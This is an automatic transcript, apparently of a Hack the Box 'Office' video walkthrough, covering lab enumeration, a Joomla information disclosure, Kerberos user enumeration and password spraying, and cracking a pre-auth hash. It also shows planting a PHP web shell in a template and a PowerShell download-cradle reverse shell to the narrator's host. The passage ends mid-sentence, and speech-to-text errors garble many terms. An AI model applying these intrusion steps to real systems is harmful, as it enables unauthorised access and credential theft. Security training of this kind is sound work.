@@ -1,0 +1,970 @@
+0.000000	1.480000	 What's going on YouTube is Ipsen.
+1.480000	2.920000	 I'm doing office from Hack the Box,
+2.920000	4.240000	 which is a hard Windows machine
+4.240000	5.520000	 that has a lot of steps.
+5.520000	7.440000	 Seriously, the hardest part about this box
+7.440000	9.280000	 is all the recon you have to do.
+9.280000	11.320000	 Each of the exploits isn't too technically hard,
+11.320000	12.960000	 but they can be hard to find.
+12.960000	15.280000	 It starts off with a jimla information disclosure
+15.280000	17.120000	 that gets you the MySQL password,
+17.120000	20.600000	 and you can pair that up with a curb roast brute force
+20.600000	22.560000	 on Active Directory using curb root
+22.560000	24.800000	 to get potential user names that let you log
+24.800000	27.960000	 into a file share, that file share has a peak up file,
+27.960000	29.360000	 that has a curb roast handshake
+29.360000	32.800000	 that you can manly craft a hash in order to crack it.
+32.800000	35.080000	 And then once you crack that, you log into jimla,
+35.080000	37.680000	 you can get a shell through editing the template.
+37.680000	40.160000	 And on the box, you discover another website
+40.160000	43.040000	 that you can upload resumes to.
+43.040000	45.200000	 You can upload a library office document
+45.200000	47.120000	 and get code execution through an exploit
+47.120000	49.840000	 or enabling macros through editing the registry.
+49.840000	51.840000	 Then you log in as a different user.
+51.840000	54.120000	 You can get a credential through D-Pappy
+54.120000	57.120000	 that lets you log in as a user that has
+57.120000	59.200000	 group policy management privileges.
+59.200000	61.200000	 I know that's a lot, so let's just jump in.
+61.200000	63.040000	 As always, we're gonna start off with an end map.
+63.040000	64.640000	 So dash SC for default scripts,
+64.640000	67.760000	 SV, enumerate versions, dash VV for double verbose.
+67.760000	69.640000	 So we have the TTL and things like that.
+69.640000	71.160000	 O-A, I'll put all formats,
+71.160000	73.560000	 put in the end map directory and call it office.
+73.560000	76.640000	 Then the IP address of 101011.3.
+76.640000	77.800000	 This can take some time to run,
+77.800000	79.120000	 so I've already ran it.
+79.120000	82.240000	 Looking at the results, we have 12 ports open.
+82.240000	85.400000	 The first one being DNS on port 53,
+85.400000	88.240000	 and it's banner tells us it's simple DNS plus.
+88.240000	90.120000	 And knowing this is a Windows box
+90.120000	92.320000	 as other banners have called us,
+92.320000	95.600000	 we go straight down, look at LDAP and confirm
+95.600000	98.480000	 this is a Active Directory server.
+98.480000	99.920000	 But let's keep going down the list.
+99.920000	103.720000	 We have HTTP on port 80, and interesting enough,
+103.720000	108.720000	 it's not running IIS, it is running Apache HTTP-246.
+108.720000	110.840000	 And normally when you install Apache,
+110.840000	114.160000	 you're using a program called XAMPP.
+114.160000	117.360000	 And very, very recently there was a vulnerability in that.
+117.360000	120.600000	 If we just Google XAMPP,
+120.600000	122.400000	 what is it?
+122.400000	124.680000	 PHP Windows exploit.
+124.680000	126.040000	 It's from one side.
+126.040000	128.960000	 The server is not going to be vulnerable,
+128.960000	131.640000	 but it is something I would definitely look into.
+131.640000	136.200000	 I thought it was on like the Wiz site or something.
+136.200000	138.440000	 We do Wiz, here we go, Wiz.io.
+138.440000	141.720000	 And this has a lot of good information about it.
+141.720000	144.320000	 I think the reason why it's not vulnerable
+144.320000	147.200000	 is you have to have a different language set installed.
+147.200000	151.240000	 Such as Chinese, simplified Chinese or Japanese.
+151.240000	153.280000	 The only language set is English,
+153.280000	157.600000	 so it's not vulnerable to it, at least to my knowledge.
+157.600000	160.120000	 This is definitely something that's good to read.
+160.120000	162.160000	 And there's also a proof of concept exploit
+162.160000	164.160000	 if you wanted to run this.
+164.160000	167.040000	 But we can confirm it is not going to be vulnerable.
+167.040000	171.160000	 I guess we can try running it just for a piece of mind.
+171.160000	174.200000	 So if we go into this, if we look at how to run it,
+176.200000	180.800000	 we give it dash C and then the PHP system syntax.
+180.800000	183.960000	 So we're injecting this code into the web server.
+183.960000	186.240000	 And this is the URL.
+186.240000	189.640000	 So let's do Python three dash C.
+189.640000	193.360000	 I'm going to do a PHP system.
+193.360000	195.600000	 We'll do ping 10, 10, 14, eight.
+195.600000	197.000000	 So we ping ourselves.
+197.000000	203.160000	 And then let's do the target HTTP 10, 10, 11, three.
+203.160000	205.240000	 And then we can set up a TCP dump.
+206.240000	209.240000	 And see if this works.
+209.240000	213.840000	 And this is how I would go about just testing it first.
+213.840000	217.720000	 I don't know, oh, we didn't specify the Python script.
+217.720000	218.760000	 There we go.
+218.760000	220.400000	 And it says exploit may have failed.
+220.400000	226.360000	 We could add the DNS name just in case that matters.
+226.360000	230.360000	 So we can do 10, 10, 11, three, office.htb,
+230.360000	232.280000	 and then try it again.
+232.280000	237.280000	 So let's now change the URL to be office.htb.
+237.280000	241.160000	 And it doesn't look like it's vulnerable.
+241.160000	245.800000	 We could take a look at the exploit script itself
+245.800000	248.040000	 to see kind of how it's working.
+248.040000	252.360000	 So we get the URL, then we're adding percent AD.
+252.360000	255.840000	 This is, I think some type of quotation mark
+255.840000	259.040000	 or hyphen in the different language.
+259.040000	264.040000	 The percent AD is critical to like the Japanese, Chinese language set.
+264.040000	267.720000	 And then it just adds the PHP command in it.
+267.720000	269.240000	 And it adds echo leaf.
+269.240000	272.400000	 And if leaf is not in the response, then it dies.
+272.400000	275.280000	 So that is exactly how this is working.
+275.280000	278.520000	 But it's not vulnerable.
+278.520000	281.320000	 I'm assuming it's not vulnerable because of the language set.
+281.320000	285.680000	 So let's go back to end map and see what else we have.
+285.680000	290.680000	 There is Kerberus on port 88. Now we have some SMB stuff, LDAP.
+290.680000	296.360000	 We have a domain name or dc.office.htb.
+296.360000	301.360000	 So let's go ahead and add this, pseudo v@chost.
+301.360000	306.160000	 DC, okay.
+306.160000	310.080000	 Go to the next port.
+310.080000	311.800000	 We have four, four, three.
+311.800000	316.800000	 This is just looks like Apache, looks slightly different
+316.800000	320.080000	 'cause it's just a forbidden according to end map.
+320.080000	323.640000	 So let's just try HTPS, office.htb.
+323.640000	324.680000	 See what happens here.
+324.680000	329.240000	 We go to advanced, except, and we just get a forbidden.
+329.240000	331.880000	 So there's a different site here, I believe.
+331.880000	337.160000	 If we went back up to port 80, it is running Juma, right?
+337.160000	340.200000	 So if I just did HTTP instead of HTPS,
+341.120000	343.440000	 we get the Juma website.
+343.440000	345.920000	 So something odd is going on there.
+345.920000	350.360000	 After four, four, three, we have SMB on four, four, five.
+350.360000	353.200000	 I don't know what four, six, four is.
+353.200000	355.920000	 Let's buy some Kerberus thing, LDAP.
+355.920000	360.960000	 And that is about it.
+360.960000	364.720000	 So let's go and take a look at the website, I guess.
+364.720000	367.080000	 We know this is Juma because end map did tell us
+367.080000	369.560000	 if we went to like robots.txt.
+370.520000	372.160000	 It tells us this is Juma.
+372.160000	373.680000	 And if you watch a lot of my videos,
+373.680000	378.760000	 there is a way to enumerate Juma version.
+378.760000	380.600000	 I always forget the path that's,
+380.600000	383.520000	 if you Google Juma Administrator Manifest,
+383.520000	386.320000	 there's an XML document called like Manifest.xml.
+386.320000	389.560000	 It's under ManifestFilesJuma.xml.
+389.560000	390.400000	 That's it.
+390.400000	392.840000	 Manifest, there we go.
+392.840000	396.280000	 And this is gonna give us the Juma version.
+396.280000	398.800000	 So we have four to seven.
+398.800000	403.000000	 So I'm going to Google Juma 427Xploit.
+403.000000	408.280000	 And we can see there are a few.
+408.280000	412.320000	 And let's see.
+412.320000	415.520000	 I was looking for one like on GitHub.
+415.520000	419.840000	 This looks like it is probably Metasploit
+419.840000	421.600000	 'cause it's in Ruby.
+421.600000	425.160000	 But we have covered this exact CVE before.
+425.160000	427.640000	 Maybe this is a proof of concept.
+427.640000	432.640000	 And the one we did it in is DevVoreTex, I want to say.
+432.640000	434.160000	 Let's see.
+434.160000	438.520000	 Juma, yeah, it was 426 and that one.
+438.520000	440.800000	 But if you want to look more in this exploit,
+440.800000	443.560000	 go to DevVoreTex where we do it all manually
+443.560000	444.880000	 and explain it probably a bit better
+444.880000	446.440000	 than I'm going to do now.
+446.440000	448.080000	 But let's just go and run this.
+448.080000	453.000000	 Essentially, it is a forgetting,
+453.000000	455.040000	 blanking on the word right now.
+455.040000	460.040000	 To get clone, it is a IDOR vulnerability essentially.
+460.040000	466.480000	 I think it's like insecure direct object reference
+466.480000	467.480000	 is what it stands for.
+467.480000	471.720000	 But there is a API endpoint in Juma
+471.720000	475.240000	 that is not properly requiring authentication
+475.240000	478.720000	 when you specify the variable.
+478.720000	480.800000	 And as I say that, remember, it's not an IDOR.
+480.800000	482.680000	 It's a massive assignment vulnerability
+482.680000	489.440000	 because if we go in this exploit, we have to add public equals true.
+489.440000	493.760000	 And the mass assignment converts all the endpoints to be public
+493.760000	495.720000	 as long as we add this argument.
+495.720000	497.680000	 Definitely go check out the DevVoreTex video
+497.680000	499.320000	 if you want to see more of that.
+499.320000	503.040000	 But let's just go ahead and run this exploit.
+503.040000	507.520000	 Let's do -U, HTTP, office.htb.
+507.520000	510.480000	 And let's check if the thing is vulnerable.
+510.480000	514.680000	 And it hits a bunch of endpoints, does find one that has a password.
+514.680000	517.040000	 So you may think if we just take this password,
+517.040000	520.880000	 we go over to the Juma log in.
+520.880000	522.840000	 And we shouldn't be able to log in with this password.
+522.840000	527.920000	 If we do administrator, and we can't.
+527.920000	531.280000	 So if you want to see exactly what this is,
+531.280000	533.560000	 I guess we could edit the script.
+533.560000	535.440000	 Let's see.
+535.440000	538.120000	 What does it say, password?
+538.120000	540.160000	 If I search for no,
+540.160000	543.000000	 user names.
+543.000000	543.960000	 Let's see.
+543.960000	545.960000	 Green, OK?
+545.960000	548.680000	 Let's just do a console print.
+548.680000	550.960000	 And we want to send the URL.
+550.960000	552.400000	 What is it?
+552.400000	554.640000	 Target plus path.
+554.640000	556.520000	 I'm looking right up here.
+556.520000	558.720000	 How it does the get.
+558.720000	561.680000	 And then we will run this exploit again and look at the URL.
+561.680000	563.320000	 It actually queries.
+563.320000	565.640000	 So we're getting the application config.
+565.640000	569.000000	 So if we go here, we look at this.
+569.000000	572.720000	 And let's see.
+572.720000	574.720000	 We have my SQL application.
+574.720000	578.480000	 The hers name is localhost user root.
+578.480000	579.920000	 And then the password here.
+579.920000	584.360000	 So all we're doing here is looking at the MySQL config.
+584.360000	587.520000	 And that is the password for the MySQL user.
+587.520000	592.520000	 If we look at the info up here,
+592.520000	596.040000	 there's only one username on Juma and that's administrator.
+596.040000	598.600000	 So we have to figure out exactly what to do
+598.600000	600.240000	 with this password.
+600.240000	603.000000	 It's probably going to be used somewhere else in this box.
+603.000000	608.480000	 And if we went back to the end map results,
+608.480000	611.320000	 this is a domain controller, right?
+611.320000	616.760000	 So the first thing I would do is see if I can do a RPC brute
+616.760000	618.160000	 force because that's the best way
+618.160000	621.760000	 to blindly enumerate user names on a domain controller.
+621.760000	625.160000	 So we have to get some type of authentication to the DC
+625.160000	626.120000	 this way.
+626.120000	632.640000	 So I'm going to just try user of guest and a password
+632.640000	637.280000	 and see if we get a successful authentication.
+637.280000	638.840000	 It takes a little bit.
+638.840000	641.800000	 I wonder if I should just do two of these simultaneously.
+641.800000	643.760000	 So we have guest account disabled.
+643.760000	646.920000	 We can say does not exist.
+646.920000	647.880000	 Try this.
+647.880000	652.360000	 See if we can get any way to get the DC to give us access.
+652.360000	655.240000	 Occasionally, it's configured that allows anonymous users
+655.240000	656.880000	 access to the DC.
+656.880000	659.360000	 And if it does, then we can do the RID brute force
+659.360000	661.280000	 without any type of credentials.
+661.280000	664.840000	 But it doesn't look like we'll be able to hear.
+664.840000	667.800000	 So the other thing we can do is something
+667.800000	671.320000	 called curve root, or brute forcing
+671.320000	673.400000	 through curve roast pre-authentication.
+673.400000	675.600000	 I want to say is how it does it.
+675.600000	676.840000	 But through the curve roast protocol,
+676.840000	681.080000	 we can validate if a user exists or not.
+681.080000	683.360000	 The benefit to the RID brute force
+683.360000	685.760000	 is we can just do it based upon numbers.
+685.760000	689.320000	 We just specify like the UID of 1,000, 1,000, 1,000, 1,000, 2,
+689.320000	693.200000	 1,000, 3, and we get the username correlated to that UID.
+693.200000	695.120000	 With curve root, we have to actually
+695.120000	696.440000	 know the username.
+696.440000	700.640000	 So it's not as good at just blindly enumerating.
+700.640000	702.600000	 But if you give it a large enough word list,
+702.600000	704.800000	 you can get a lot of usernames.
+704.800000	706.400000	 So I'm going to do curve root user
+706.400000	713.480000	 enumer, we'll specify the DC, which is 1010113, then the domain
+713.480000	715.640000	 office.htb.
+715.640000	718.920000	 And then we want to give it the username file.
+718.920000	723.480000	 So I do opt, secList, userNames, and then
+723.480000	726.880000	 that Zato 10 million userNames.
+726.880000	730.040000	 And I'm also going to specify 100 threads.
+730.040000	732.400000	 So it goes a little bit quickly.
+732.400000	733.960000	 UserNames.Text.
+733.960000	736.160000	 There we go.
+736.160000	739.160000	 And we probably need a out file as well.
+739.160000	741.480000	 That is -0.
+741.480000	744.320000	 So I'm going to give it -0.
+744.320000	746.080000	 We'll say curve root.out.
+746.080000	750.520000	 It did not like that.
+750.520000	754.360000	 -0 should be output.
+754.360000	759.280000	 I don't know why.
+759.280000	763.800000	 One of it doesn't have permission.
+763.800000	769.440000	 Let's go htb.officecurbrute.out.
+769.440000	770.360000	 There we go.
+770.360000	773.760000	 I guess that's just a poorly handled error message.
+773.760000	777.360000	 If we looked up, maybe it says, OK, yeah.
+777.360000	780.680000	 Panic, opencurbrute.out, permission denied.
+780.680000	783.000000	 So here, we're just validating userNames.
+783.000000	784.320000	 We have two right off the bat.
+784.320000	786.800000	 Windows is not case sensitive.
+786.800000	792.280000	 So we probably could speed this up by making this word list
+792.280000	793.800000	 all lowercase.
+793.800000	796.800000	 But we have quite a few userNames right off the bat.
+796.800000	799.480000	 This is probably going to take like 15 minutes to run.
+799.480000	802.640000	 So I'm just going to periodically take this userName list
+802.640000	805.800000	 and we can spray it with the password we got from Juma,
+805.800000	808.360000	 which we probably should copy the creds.
+808.360000	811.760000	 Or let's just call it passwords.out.
+811.760000	813.040000	 That's the wrong clipboard.
+813.040000	814.640000	 There we go.
+814.640000	816.120000	 So let's see.
+816.120000	818.080000	 We want to get all those userNames.
+818.080000	821.720000	 If I catcurbrute.out, we can pipe this.
+821.720000	824.120000	 So we can grip on valid.
+824.120000	834.520000	 And then we say, OK, print, let's see, 1, 2, 3, 4, 5, 6, 7, OK.
+834.520000	837.520000	 And then let's just split on the at sign
+837.520000	839.040000	 because we only want to use the name.
+839.040000	842.160000	 We don't need the whole domain.
+842.160000	845.120000	 And we can say usernames.text.
+845.120000	846.440000	 There we go.
+846.440000	849.560000	 So now we want to spray with that password.
+849.560000	858.560000	 So let's do a NXC, SMB, 1010, 11, 3, and then dash you.
+858.560000	863.080000	 I'm going to give it the userNames.text, the password.
+863.080000	865.400000	 I think we can give it just password.out.
+865.400000	868.440000	 That should just work fine.
+868.440000	872.000000	 And then I'm going to give it continue on success.
+872.000000	873.600000	 Just in case there's multiple users
+873.600000	876.560000	 that this password goes to.
+876.560000	880.600000	 So let's see if it starts cranking.
+880.600000	882.760000	 So we got password failures.
+882.760000	885.240000	 It looks like DWOLF.
+885.240000	886.800000	 We can access.
+886.800000	895.400000	 So let's do userName as DWOLF.
+895.400000	898.120000	 And then let's see what we have.
+898.120000	899.000000	 It doesn't say Pwn.
+899.000000	903.760000	 So we can't just like PS exec do it.
+903.760000	906.680000	 DWOLF is not an administrator there.
+906.680000	913.560000	 But looking at the shares, we can see we have a SOC analysis.
+913.560000	918.200000	 We could have also done RID Brute from here.
+918.200000	919.640000	 Because now we have a valid credential.
+919.640000	925.400000	 If we wanted to get are the userNames quickly, this should work.
+925.400000	930.240000	 As long as the flag is RID Brute.
+930.240000	934.280000	 So this is another way we could get userNames.
+934.280000	938.320000	 We have a web account as well.
+938.320000	941.000000	 I don't think T-Starch has been shown.
+941.000000	943.320000	 But yeah.
+943.320000	945.840000	 So let's see.
+945.840000	946.920000	 We had shares.
+946.920000	950.280000	 There is this SOC analysis.
+950.280000	952.960000	 So we want to be able to read this.
+952.960000	959.640000	 So let's do a SMB client, dash capital U, DWOLF,
+959.640000	968.800000	 10, 10, 11, 3, SOC analysis, like that.
+968.800000	971.560000	 And the password, it's a domain controller.
+971.560000	975.360000	 So we don't need to worry about the domain name.
+975.360000	981.760000	 We probably should do office.htb/dWOLF.
+981.760000	985.920000	 But domain controllers, you don't have to specify the domain at all.
+985.920000	988.720000	 So looking at this, there is a PCAP file.
+988.720000	994.840000	 So let's just do a get on this.
+994.840000	996.840000	 And then let's examine what's in this PCAP.
+996.840000	1002.680000	 So we'll do wireshark, latestsystem.pcap.
+1002.680000	1004.680000	 And normally, the first thing I would do,
+1004.680000	1006.600000	 it's not going to be beneficial on this box
+1006.600000	1011.040000	 because the hash that's in it is not supported.
+1011.040000	1013.840000	 Maybe in the future, we'll play with adding it.
+1013.840000	1018.120000	 But I like running a tool called P creds against PCAPs
+1018.120000	1019.000000	 whenever I get it.
+1019.000000	1021.680000	 You can just look at the GitHub here and run it.
+1021.680000	1023.440000	 That would probably be my first step
+1023.440000	1026.960000	 if I was going and completely blind.
+1026.960000	1029.840000	 But let's look at wireshark to see exactly what type of traffic
+1029.840000	1030.360000	 we have.
+1030.360000	1034.400000	 There's some DNS stuff that is business being--
+1034.400000	1039.560000	 so that's not interesting.
+1039.560000	1040.640000	 So let's see.
+1040.640000	1043.880000	 Let's look at SMB.
+1043.880000	1046.040000	 I think there's anything interesting here.
+1046.040000	1048.600000	 It doesn't look like too much.
+1048.600000	1053.880000	 I was hoping to see maybe a authentication or user
+1053.880000	1055.000000	 or file transfer.
+1055.000000	1055.920000	 I don't see anything.
+1055.920000	1062.200000	 We can look at NTLM SSP.
+1062.200000	1064.920000	 This is another just authentication.
+1064.920000	1066.560000	 We can look at the SMB header.
+1066.560000	1068.320000	 I don't see a username here.
+1068.320000	1071.600000	 So that's probably not going to be beneficial to us.
+1071.600000	1073.800000	 We can also check Kerberos.
+1073.800000	1076.520000	 And look at this.
+1076.520000	1089.800000	 So this is the request, CPA data, request body,
+1089.800000	1091.480000	 and this KBTGT.
+1091.480000	1093.960000	 This is the S name, which I think is server name.
+1093.960000	1096.240000	 This is where we're authenticating to.
+1096.240000	1100.640000	 If we look at C name, this should be R's.
+1100.640000	1101.720000	 So T-stark.
+1101.720000	1105.520000	 So we have potentially the handshake of T-stark.
+1105.520000	1106.840000	 If we look at encryption type, this
+1106.840000	1109.520000	 is going to be encryption type 18.
+1109.520000	1113.480000	 And P creds, I think, supports 23, not 18.
+1113.480000	1115.840000	 But it's not hard to manually create these hashes,
+1115.840000	1119.000000	 as long as you have the encrypted timestamp, which we don't
+1119.000000	1120.440000	 have.
+1120.440000	1122.480000	 It would be right here, so this is the request.
+1122.480000	1124.400000	 If we go to the second packet, though,
+1124.400000	1126.560000	 we have the encrypted timestamp.
+1126.560000	1130.760000	 And if we look at the value, we have this right here.
+1130.760000	1135.160000	 And this is going to be key for generating the hash
+1135.160000	1137.880000	 that HashKat will use to be able to crack this.
+1137.880000	1143.320000	 So let's go Google HashKat example hashes
+1143.320000	1147.320000	 to see how to format this.
+1147.320000	1150.120000	 So let's see.
+1150.120000	1151.840000	 How is the quickest way to find this?
+1151.840000	1159.680000	 Probably if I search for K or B. Let's see.
+1159.680000	1163.040000	 So if we look at this, this is the most common one, the AS
+1163.040000	1164.720000	 request pre-auth.
+1164.720000	1168.080000	 I'm going to search eType 18.
+1168.080000	1169.840000	 And we have a TGS wrap right here.
+1169.840000	1171.520000	 And this is what we want.
+1171.520000	1174.320000	 I believe maybe there's other eType 18.
+1174.320000	1184.480000	 So it's other TGS or pre-auth or DB.
+1184.480000	1188.600000	 Let's see.
+1188.600000	1191.600000	 I'm guessing it's going to be actually a pre-authentication
+1191.600000	1192.840000	 encryption type 18.
+1192.840000	1200.600000	 So let's go and grab this.
+1200.600000	1203.600000	 I'm just going to call it hashes.
+1203.600000	1206.440000	 And this is going to be example.
+1206.440000	1208.760000	 And we want to paste this.
+1208.760000	1210.760000	 So whoops.
+1210.760000	1217.360000	 And by paste, I just met like creator own.
+1217.360000	1219.880000	 So we leave 18.
+1219.880000	1222.400000	 So this one is going to be the username.
+1222.400000	1226.480000	 So that was what T Shark.
+1226.480000	1228.680000	 Let's go back to Wireshark.
+1228.680000	1231.480000	 Where is C name T Stark, not Shark?
+1231.480000	1236.960000	 Probably Tony Stark, because the whole Jumwa
+1236.960000	1239.200000	 was Avengers-themed.
+1239.200000	1241.840000	 And then we have hashcatdomain.com.
+1241.840000	1244.320000	 Let's call this office.htb.
+1244.320000	1246.440000	 That's just the domain name.
+1246.440000	1250.480000	 And then this piece is going to be the actual hash,
+1250.480000	1253.200000	 the encrypted timestamp.
+1253.200000	1257.760000	 So let's go and grab the encrypted timestamp.
+1257.760000	1259.120000	 There we go.
+1259.120000	1263.200000	 Copy, value, and paste.
+1263.200000	1270.680000	 So this should be the hash for T Stark.
+1270.680000	1272.720000	 So let's go over to the crackin, which
+1272.720000	1275.400000	 is just another machine on my network.
+1275.400000	1278.000000	 Because I don't want to run hashcat on my VM
+1278.000000	1280.160000	 that I'm using to record videos and stuff,
+1280.160000	1282.000000	 because it's very CPU-intensive.
+1282.000000	1286.480000	 And you should probably never use hashcat on your VM.
+1286.480000	1288.200000	 It should always be on bare metal.
+1288.200000	1292.920000	 So let's go and create office.
+1292.920000	1295.680000	 We can paste this hash in.
+1295.680000	1305.320000	 And then we can say ./ hashcat, hashesoffice, and what do we--
+1305.320000	1308.280000	 want to give it as a word list, upwordlistrocku.text.
+1308.280000	1314.760000	 And it seems like it is going away.
+1314.760000	1315.800000	 And let's see.
+1315.800000	1318.120000	 We have recovered one out of one.
+1318.120000	1323.520000	 So if I add a dash to our show, we can see it got the password
+1323.520000	1325.200000	 as Playboy69.
+1325.200000	1328.200000	 So now we have Tony Stark's password.
+1328.200000	1331.360000	 So let's try this against Jumwa.
+1331.360000	1335.240000	 So I'm going to go back to the administrator page.
+1335.240000	1342.960000	 And then we'll say T Stark put in that password.
+1342.960000	1347.560000	 Did not work.
+1347.560000	1349.560000	 Let's try administrator with this.
+1349.560000	1352.360000	 Maybe Tony is the person that set up Jumwa.
+1352.360000	1353.640000	 And he is.
+1353.640000	1355.080000	 And I should have done that known that before,
+1355.080000	1357.360000	 because when we're doing this whole enumeration thing
+1357.360000	1359.840000	 with the Jumwa exploit, there was only one username.
+1359.840000	1361.560000	 And that was administrator, right?
+1361.560000	1364.680000	 So that's why we definitely couldn't use Tony Stark.
+1364.680000	1370.960000	 So let's go and find where the template is.
+1370.960000	1374.760000	 Because the quickest way to get RCE once you're on ACMS
+1374.760000	1377.640000	 is to look at the templating area,
+1377.640000	1381.800000	 because most CMSs have it, and then just edit a PHP script.
+1381.800000	1386.880000	 So I'm going to edit offline.php.
+1386.880000	1391.200000	 And we just want to make sure we can find this.
+1391.200000	1392.400000	 So let's see.
+1392.400000	1396.840000	 It is HTTP, Office HTTP.
+1396.840000	1407.920000	 It's in templates, and then Cassiopia, and we
+1407.920000	1412.640000	 set offline.php, OK?
+1412.640000	1416.360000	 So let's just make sure we can get code execution.
+1416.360000	1420.960000	 So I'm going to do it if is set, and then request CMD.
+1420.960000	1424.280000	 And the reason why I do this is if you don't put this if then,
+1424.280000	1430.960000	 and then just do the system command, like system request CMD,
+1430.960000	1434.040000	 if we just did this, then the page would air if anyone
+1434.040000	1440.480000	 hit this offline.php, because it can't find this variable, right?
+1440.480000	1442.240000	 And you never really want to do that,
+1442.240000	1445.040000	 because it just tells everyone how to execute code.
+1445.040000	1447.960000	 Also, like if you're doing it on index.php,
+1447.960000	1450.520000	 then the error message could just take down the website.
+1450.520000	1455.760000	 So it's always best to put it in a if is set first.
+1455.760000	1458.840000	 So let's save this.
+1458.840000	1464.680000	 And now we can just do CMD equals who am I?
+1464.680000	1466.160000	 And it did not work.
+1466.160000	1466.680000	 Let's see.
+1466.680000	1470.880000	 If is set request CMD, maybe it didn't save by the time
+1470.880000	1479.600000	 we executed it, Control-U, something wonky is going on.
+1479.600000	1480.200000	 Let's see.
+1480.200000	1494.040000	 If is set, speedp need this, I don't think so.
+1494.040000	1495.720000	 Let's do an actor as well.
+1501.320000	1516.120000	 See, I am offline, it's not cached.
+1516.120000	1522.120000	 Let's see.
+1522.120000	1530.280000	 I definitely couldn't error there.
+1530.280000	1535.400000	 Okay, so I'm not sure why it didn't work before
+1535.400000	1542.760000	 when I just had this, but we have got execution.
+1542.760000	1543.760000	 Awesome.
+1543.760000	1546.440000	 So let's go ahead and send this over to Burp Suite
+1546.440000	1550.080000	 so we can quickly get a reverse shell.
+1550.080000	1555.600000	 Let's go proxy, intercept is on, send this,
+1555.600000	1559.360000	 go over to repeater, convert this request.
+1559.360000	1562.160000	 And now I need to create a web cradle.
+1562.160000	1566.880000	 So what I'm going to do is make a directory, dub, dub, dub.
+1566.880000	1574.560000	 And then let's copy opt or CP user local.
+1574.560000	1577.360000	 Wasn't a shame.
+1577.360000	1579.320000	 User share in a shame.
+1579.320000	1584.760000	 Shells, PowerShell, or invoke.
+1584.760000	1590.840000	 PowerShell TCP, OneLine.ps1.
+1590.840000	1597.160000	 And we probably should rename this to just shell.ps1.
+1597.160000	1598.720000	 And let's see.
+1598.720000	1600.640000	 Let's delete that.
+1600.640000	1604.720000	 And then edit the IP address to be ours.
+1604.720000	1606.760000	 So 10, 10, 14, 8.
+1606.760000	1609.840000	 And I always like sending it to port 9,001.
+1609.840000	1614.880000	 So what we have to do now is sort of a web server.
+1614.880000	1620.160000	 And then we can go over here and do a PowerShell, ix,
+1620.160000	1636.240000	 new object, net.web, client, download, string, HTTP, 10, 10, 14, 8, port 8,000, shell.ps1.
+1636.240000	1640.800000	 XeLVNP, 9,001, send the string.
+1640.800000	1642.440000	 And we see a get.
+1642.440000	1644.200000	 And then the connection comes through.
+1644.200000	1647.520000	 I think if we used a double quirk, it actually wouldn't work.
+1647.520000	1649.040000	 Let's just test this out.
+1649.040000	1654.080000	 Because I know people sometimes have trouble with this.
+1654.080000	1658.400000	 Have a vague memory of this being very like Quartz-specific, right?
+1658.400000	1661.120000	 You can see the double quirk is not working.
+1661.120000	1664.520000	 I'm going to buy URL and code this.
+1664.520000	1666.200000	 Let's just go convert selection.
+1666.200000	1669.720000	 URL, whole characters, tour.
+1669.720000	1670.840000	 No.
+1670.840000	1677.800000	 So you definitely want to use single quarts with this.
+1677.800000	1682.240000	 So if you're just at a habit using doubles, it's not going to work.
+1682.240000	1691.960000	 Or maybe there's a cron that is reverting the template.
+1691.960000	1696.200000	 Maybe that's what got me earlier.
+1696.200000	1701.080000	 Let's just turn BipSweep off, refresh.
+1701.080000	1707.080000	 Let's save this, refresh, OK.
+1707.080000	1707.760000	 Maybe that's it.
+1707.760000	1714.600000	 So double quarts do not work.
+1714.600000	1718.080000	 Let's convert selection, URL, all characters.
+1720.920000	1724.320000	 Still nothing.
+1724.320000	1728.600000	 Let's go back to single quarts.
+1728.600000	1731.400000	 And that's definitely taking longer to get our shell.
+1731.400000	1733.720000	 Now, I forgot to do one thing that I always like doing.
+1733.720000	1736.560000	 And that is setting up our URL.
+1736.560000	1739.120000	 So I can have the up and down errors with my shell.
+1739.120000	1742.520000	 So let's go do that again.
+1742.520000	1747.400000	 And now we have a shell as who are we, the web account.
+1747.400000	1749.080000	 So the first thing I always look at
+1749.080000	1752.320000	 is just a who am I slash call, or slash Prives.
+1752.320000	1755.360000	 Because the main thing I want to see is if we have SEM
+1755.360000	1757.840000	 personate, normally when you exploit a web service,
+1757.840000	1759.480000	 you'll have this on a Windows box.
+1759.480000	1760.240000	 Here we don't.
+1760.240000	1762.240000	 But if we had it, we could use one of the potatoes
+1762.240000	1764.800000	 to quickly escalate to root.
+1764.800000	1767.760000	 The other thing we'd look at is just the members we are,
+1767.760000	1770.680000	 or the groups, looking at this quickly,
+1770.680000	1775.280000	 I don't really see any groups that really stand out, right?
+1775.280000	1778.560000	 So when we first did this, or when we first
+1778.560000	1780.800000	 accessed the box, there was something on like
+1780.800000	1785.120000	 HTTPSoffice.htb, and that was forbidden.
+1785.120000	1788.120000	 So I want to see what else there is on this web server.
+1788.120000	1791.240000	 Normally, I would go pillage like the jumea config
+1791.240000	1794.080000	 and look for the password that is my SQL.
+1794.080000	1797.680000	 But we already got that from that one jumea exploit, right?
+1797.680000	1801.400000	 So I'm going to go in SQL example, HT docs.
+1801.400000	1803.840000	 And then we have a administrator directory,
+1803.840000	1805.160000	 internal and jumea.
+1805.160000	1807.720000	 So these are probably three different sites.
+1807.720000	1811.200000	 One of these is probably going to be the HTTPS.
+1811.200000	1815.400000	 And there's a logs directory, one error PHP.
+1815.400000	1818.360000	 I don't know what this is.
+1818.360000	1819.120000	 Don't have an account.
+1819.120000	1824.000000	 So jumea is writing logs here for whatever reason.
+1824.000000	1826.240000	 Is that on this?
+1826.240000	1827.160000	 What is logs?
+1827.160000	1831.800000	 Doesn't look like that's coming back.
+1831.800000	1836.160000	 So I really don't know what administrator is.
+1836.160000	1842.640000	 And looks like my session is not active.
+1842.640000	1844.680000	 Can we ping it, ping 10, 10, 11, 3?
+1844.680000	1853.640000	 Looks like maybe my VPN had died.
+1853.640000	1854.680000	 Looks like it did.
+1854.680000	1855.360000	 OK, sweet.
+1855.360000	1856.320000	 My shell is still alive.
+1856.320000	1858.640000	 That is a miracle.
+1858.640000	1863.760000	 We go to internal logs.
+1863.760000	1865.000000	 I did ASD.
+1865.000000	1866.520000	 It is also forbidden.
+1866.520000	1869.960000	 So that wasn't like a 404.
+1869.960000	1872.080000	 If I did ASD and got a 404, then I
+1872.080000	1874.320000	 know I was definitely in that administrator directory,
+1874.320000	1876.280000	 but I don't.
+1876.280000	1880.600000	 Looking at internal, we got resume.php.
+1880.600000	1886.560000	 If we look at this, don't know exactly what this site is.
+1886.560000	1889.560000	 I can't make sense of the HTML.
+1889.560000	1890.760000	 We have PHP here.
+1890.760000	1893.400000	 It's looking at the file name, allowings
